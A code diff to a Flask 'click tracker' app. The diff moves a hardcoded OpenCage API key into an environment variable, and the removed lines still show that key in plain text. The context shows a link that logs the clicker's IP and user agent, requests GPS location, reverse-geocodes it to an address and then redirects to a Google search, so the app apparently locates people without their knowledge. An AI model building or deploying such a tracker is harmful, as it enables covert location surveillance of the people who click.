@@ -13,13 +13,15 @@ app = Flask(__name__)
 FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
 DATABASE_FILE = 'click_tracker.db'
 
-# ⚠️ PASTE YOUR OPEN CAGE KEY HERE 
-OPENCAGE_API_KEY = "57846fc1e1014975b603db1c658fcf50" # REPLACE WITH YOUR ACTUAL KEY
+# ⚠️ FINAL FIX: Load API Key from Render Environment Variable 
+# This is the secure way to handle secrets in production.
+OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "MISSING")
+
 # Initialize the OpenCage client
-if OPENCAGE_API_KEY != "57846fc1e1014975b603db1c658fcf50":
+if OPENCAGE_API_KEY != "MISSING":
     geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
 else:
-    # If key is missing, the geocoding functions will return "API Key Missing"
+    # If key is missing in environment, Geocoding will fail gracefully
     geocoder = None
 
 
@@ -79,7 +81,8 @@ def log_click_data(ip, location, user_agent, source="IP"):
 def get_address_from_coords(lat, lon):
     """Uses OpenCage API to convert coordinates to a readable address."""
     if not geocoder:
-        return "API Key Missing"
+        # Returns the error code we were seeing in the logs
+        return "API Key Missing (Check Render Environment Variables)"
 
     try:
         results = geocoder.reverse_geocode(lat, lon, limit=1)
@@ -87,14 +90,14 @@ def get_address_from_coords(lat, lon):
         if results and results[0]['formatted']:
             return results[0]['formatted']
         else:
-            return "Address Not Found"
+            return "Address Not Found via OpenCage"
             
     except Exception as e:
         print(f"OpenCage API Error: {e}")
         return "Geocoding API Error"
 
 
-# 0. NEW ROUTE: Home Page (Needed for Server Stability)
+# 0. NEW ROUTE: Home Page (Ensures Server Stability)
 @app.route('/')
 def home():
     """A basic route to confirm the server is running."""
@@ -107,7 +110,6 @@ def track_click():
     user_ip = request.remote_addr 
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    # Redirect to the page that requests GPS location via JavaScript
     return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")
 
 
